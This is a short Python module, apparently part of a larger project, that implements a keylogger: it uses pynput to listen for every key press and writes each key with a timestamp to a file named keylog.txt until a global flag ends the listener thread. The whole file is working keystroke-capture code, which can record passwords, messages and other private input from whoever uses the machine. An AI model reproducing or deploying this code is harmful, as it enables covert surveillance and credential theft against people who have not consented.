# globals is the global thread variable, which is correlated to the status of the keyboard listener thread.
import globals
from pynput.keyboard import Key, Listener
import logging

#Defines the format for the logging functionality, which involes the date and time
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
#function for what to occur on every singly key press that is detected
def on_press(key):
    if globals.end_thread == False:
        logging.info(str(key))

# function used inside the main file which starts the listener and appends all inputs to the keylog file
def start_listener():
    listener = Listener(on_press=on_press)
    listener.start()
    listener.join()